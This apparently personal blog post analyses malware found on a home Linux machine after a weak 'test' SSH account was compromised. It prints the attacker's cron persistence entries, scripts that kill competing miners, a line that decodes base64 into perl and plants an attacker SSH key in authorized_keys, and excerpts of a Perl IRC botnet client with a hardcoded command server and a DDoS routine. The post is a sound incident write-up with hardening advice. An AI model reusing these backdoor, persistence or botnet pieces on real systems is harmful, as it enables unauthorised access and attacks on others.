---
title: "Hacked"
date: 2022-11-12T23:56:13Z
draft: false
categories: ["Coding"]
---
I got hacked.

There are all kinds of fun exploits people use to get into systems they're not
supposed to be in.  In my case they used `ssh`.  Normally `ssh` is secure.  None
of my passwords are brute-forceable.  (Yes, you shouldn't have public-facing
password ssh... but that's no fun when you're on someone else's computer and
need to get in in a hurry.)  But in a moment of weakness I had needed a blank
slate to test an environment regression against.  So I did `useradd test` with
the password `test`, and set up a home directory and shell.  It was only
supposed to last ten minutes.  I suppose I must have been called away.

Earlier I came to the computer to find this:

Well that's not good.  What on earth is `kswapd0` complaining about?  There's
plenty of ram.  Must be a pessimal case from a memory leak in the browser;
although curiously toggling swap (`swapoff -a` and then `swapon -a`) didn't seem
to kill it.  But I was in a hurry and doing something else, so I rebooted the
computer and walked away.

When I came back, `kswapd0` was still causing problems.  And surely it shouldn't
run under the user `test`?  I assumed `test` was a (poorly named) system user,
but no, `su test` prompts for a password and `sudo su test; cd ~` gets me a home
directory with things I clearly put there, and `fish` as a shell (which no
system account would have).  Oh, and it's `./kswapd0`: surely no kernel service
would use relative paths (or even paths at all?).

At this point it slowly dawned on me what had happened.  I unplugged the
ethernet cable and went looking: what was happening?

## Analysis

There were two processes running for `test`: `./kswapd0` and `rsync`.
`/proc/N/cmdline` gave the expected names, but `readlink -f /proc/$RSYNCPID/exe`
was `/usr/bin/perl`.  Oh no.  What on earth were they running?   Fortunately
`readlink -f /proc/$KSWAPD0PID/exe` took me straight to the directory with the
code in, and it could be copied before killing the processes (which didn't
endeavour to clean up).

I didn't delete `test` just yet.  After all, the damage is done, and the
ethernet is pulled.  Rather I went looking inside `.configrc` (sic!) which
contained two directories (imaginatively named `a` and `b`) and two files:
`crond.d` and `dir2.dir`.  `dir2.dir` just contained the path to its directory,
but `cron.d` contained the following:

```
1 1 */2 * * /home/test/.configrc/a/upd>/dev/null 2>&1
@reboot /home/test/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/test/.configrc/b/sync>/dev/null 2>&1
@reboot /home/test/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
```

Ah.  The two `@reboot` lines are what start the code on boot; I didn't even know
there was such a thing as `@reboot`.  The first line just runs the same code as
the reboot at 1 minute past 1 am every other day, presumably in case it dies or
is killed.  The third line is the same as the fourth line, but runs weekly.  The
fifth line is more interesting: it calls a file which is clearly created by the
others every third day at midnight.  This file pretends to be aptitude (I run
arch, so that would have raised eyebrows).  It's probably the phone-home code.
Fortunately it hasn't run, because `kswapd0` used so much cpu I spotted it
instantly.

## Reverse Engineering

`a/upd` contains the following:

```bash
#!/bin/sh
cd /home/test/.configrc/a
if test -r /home/test/.configrc/a/bash.pid; then
pid=$(cat /home/test/.configrc/a/bash.pid)
if $(kill -CHLD $pid >/dev/null 2>&1)
then
exit 0
fi
fi
./run &>/dev/null
```

Other than the complete lack of indentation, this is easy: it tries to read the
current pid from a file and kill the process, and then start it.  So now to
`a/run`:

```bash
#!/bin/bash
./stop
#./init0
sleep 10
pwd > dir.dir
dir=$(cat dir.dir)
ARCH=`uname -m`
	if [ "$ARCH" == "i686" ]; then
		nohup ./anacron >>/dev/null & 
	elif [ "$ARCH" == "x86_64" ];   then
		./kswapd0
	fi
echo $! > bash.pid
```

Look at that!  Even malicious code ships with commented out lines!

Here again everything is simple.  We try to stop previous instances, sleep for
a bit to let everything calm down, and then start one of two scripts.
`./anacron` (which obviously isn't anacron) wasn't shipped, but we do have
`./kswapd0`.  Firstly, though, let's look at `./stop`:

```bash
#!/bin/sh
pkill -9 cron
killall -9 cron
kill -9 `ps x|grep cron|grep -v grep|awk '{print $1}'`>.proc

pkill -9 kswapd0
killall -9 kswapd0
kill -9 `ps x|grep kswapd0|grep -v grep|awk '{print $1}'`>.proc


pkill -9 ld-linux
killall -9 ld-linux
kill -9 `ps x|grep ld-linux|grep -v grep|awk '{print $1}'`>.proc

pkill -9 Donald
killall -9 Donald
kill -9 `ps x|grep Donald|grep -v grep|awk '{print $1}'`>.proc

pkill -9 xmr
killall -9 xmr
kill -9 `ps x|grep xmr|grep -v grep|awk '{print $1}'`>.proc

pkill -9 xm64
killall -9 xm64
kill -9 `ps x|grep xm64|grep -v grep|awk '{print $1}'`>.proc
rm -rf .proc
```

Oops.  They don't know if we have `pkill` or `killall`.  So here are three
redundant copy-pasted ways to kill lets of things.  The third line should always
work, since it only depends on `ps`, which is POSIX, so the other two are
pointless.  It's rather crude, and written by someone who doesn't like spaces:
`ps x` prints the processes, then one `grep` filters them, another grep (!) filters
out the first grep instance (which will also match, because `|` is a *stream* so
`ps` is still running when `grep` starts its work) and then `awk` gets the pid.
This is saved to a file we promptly remove, which is odd enough, but haven't
they just leaked the names of a bunch of dodgy executables?  Including one
called `Donald`, which is weird enough.  I wonder which Donald that could be?
Probably Donald Duck.

Also, DRY, Russian hackers.

`file kswapd0` tells us it's a binary, so we'll come back to that one.

### 'Obfuscated' Italian Perl

Meanwhile, what about `b`?

`b/sync`, the entrypoint, contains the following pointless code:

```bash
#!/bin/sh
cd /home/test/.configrc/b
./run
```

Ah well.  I guess this is a kind of security by constant redirect.  `run`
contains this:

```bash
echo $VeryLongBase64EncodedString | base64 --decode | perl
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh
```

Let's hope that's not their only public key :p  Charming username, too.  Also
not FQDN, how rude.  The very long base64 encoded string decodes to the
following perl:

```perl
eval unpack $VeryLongPerlString
```

Hmm.  No, I don't think I will.  What about `print` for `eval`?

And neatly formatted (for once!) indented perl drops out onto the terminal.  Oh.
So after all that effort, in the language which is famous for stupid
obfuscations, they didn't bother?  Nice, I guess.

Here is some of it:

```perl
my $processo = 'rsync';

$servidor='45.9.148.99' unless $servidor;
my $porta='443';
my @canais=("#007");
my @adms=("polly","molly");
my @auth=("localhost");

my $linas_max=6;
my $sleep=3;

my $nick = getnick();
my $ircname = getnick();
my $realname = (`uname -a`);

my $acessoshell = 1;
my $prefixo = "! ";
my $estatisticas = 0;
my $pacotes = 1;

my $VERSAO = '0.2a';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
```

This is not *much* better than the obfuscated string before.  Really,
obfuscating perl is a bit of a joke---it's hard enough to read on a good day.
But these programmers have gone a step further.  They have used *portugese*.
Definitely not Russian hackers, then.  No russian would write
`die "Problema com o fork: $!" unless defined($pid);`.

What follows is an IRC bot, in a horrible language (perl, not portugese) which
someone has tried hard to make readable with indentation and all the other
things we do to make up for a language which thinks `@_` and `$_` is decent
syntax. The chatbot sits there waiting for messages in the IRC chat:

```perl
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       if ($args =~ /^\001VERSION\001$/) {
       elsif ($args =~ /^\001PING\s+(\d+)\001$/) {
       elsif (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
         elsif ($args =~ /^(\Q$meunick\E|\Q$prefixo\E)\s+(.*)/ ) {
            if ($arg =~ /^\!(.*)/) {
            } elsif ($arg =~ /^\@(.*)/) {
            } else {
         }
       }
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       foreach my $canal (@canais) {
   }
}
```

I've taken out all the code here, but it's not hard to make sense of: there's
code to respond to pings, to execute arbitrary shell commands and return, to
join irc channels, to print the version---`notice("$pn", "\001VERSION mIRC v6.16
ENE ALIN GABRIEL\001");` (Does this name mean anything?)---and to do a bunch of
other irc admin tasks.  There's also code to send debug statistics, although
it's off by default.   But really.  Even perl supports better control flow than
this horrible bunch of nested mess.

Then we find the following fun function ('subroutine'):

```perl
sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'B' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
```
Yep, it's a DDOS bot, with arbitrary command execution for fun.  And that's it,
other than loads and loads of code to manage IRC channels, kicking and finding
users etc.  If I had to guess, someone took a portugese IRC bot written in perl
(for some unknown reason) and modified it crudely to be an attack payload.  But
who knows, maybe they also use your computer to manage IRC channels?

### The binary

I have yet to dissassemble the binary.  As a guess I reckon it's a bitcoin
miner: it used a *lot* of cpu, but nothing so far really fits an attempted
ransomware attack, and linux is a poor platform for such attacks: permissions
mean you can basically only encrypt your own home directory.  Of course there
are elevation exploits, but there's no indication they tried any here.  Likewise
exfiltration is possible, although there's nothing they could read I really care
about, but again there's no evidence it happened.

If/when I get round to reverse engineering the binary, I'll update here.

## Prognosis

The system is safe.  `test` was a stupid user account, let's get rid of it:

```bash
sudo userdel test
```

No more exploit.  They *could* have done something worse, and I should probably
nuke from orbit.  But I found the usual password-spraying attacks.  In the long
run I should go back to disabling password auth entirely, but in the short-term
installing `fail2ban` provides agreeable catharsis:

```bash
sudo fail2ban-client banned
[{'sshd': ['178.128.184.213', '45.154.12.139', '115.254.63.50', '113.21.232.39', '23.95.215.44', '43.154.26.210', '49.0.129.3', '45.64.112.96', '152.32.150.45', '210.195.100.138', '183.94.133.168', '157.230.218.88', '175.139.245.205']}]
```

I was lucky; this was a low-intensity attack; there's nothing else odd in the
logs.

## Takeaways

Dev machines are going to have silly things like `adduser test` run on them.
Don't combine dev machines with public gateway servers.  Protect them with ssh
keys and default-deny security.

Oh, and do use permissions, and encrypt stuff which actually matters, and have
proper backups---ideally initiated from the backup server, not the device, which
shouldn't have write access to the server.

And watch out for portugese IRC bots.  You don't know where they've been.

## Postscriptum

Ah, it's [this
thing](https://yoroi.company/research/outlaw-is-back-a-new-crypto-botnet-targets-european-organizations/).
I guess I don't have to reverse engineer anything---it really is just a miner.




